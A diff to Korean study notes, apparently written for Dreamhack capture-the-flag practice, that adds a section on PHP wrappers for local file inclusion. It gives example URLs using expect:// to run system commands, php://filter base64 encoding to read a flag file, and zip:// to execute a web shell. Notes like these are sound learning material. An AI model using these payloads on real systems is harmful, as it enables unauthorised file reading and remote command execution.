@@ -28,3 +28,34 @@ $_GET['page'].'.php' /*쿼리로 받은 page 문자열에 .php 문자열을 붙�
 ```PHP
 $_SESSION['username']
 ```
+
+
+# PHP Wrapper
+
+- expect://
+system command를 실행시켜 줌
+```
+http://host3.dreamhack.games:18957/?file=expect://ls
+```
+
+- php://filter
+encode / decode 옵션으로 서버 안에 존재하는 문서를 열람할 수 있음
+```
+http://host3.dreamhack.games:18957/?page=php://filter/page=convert.base64-encode/resource=/var/www/uploads/flag
+```
+
+```
+http://host1.dreamhack.games:9636/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag
+```
+
+base64로 인코딩하여 php 스크립트 자체를 가져오기
+```
+http://host3.dreamhack.games:14072/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag
+```
+
+
+- zip://
+zip파일의 압축을 풀고 해당파일을 실행(웹쉘 응용)
+```
+?page_num=zip://file.zip#web_shell.php
+```
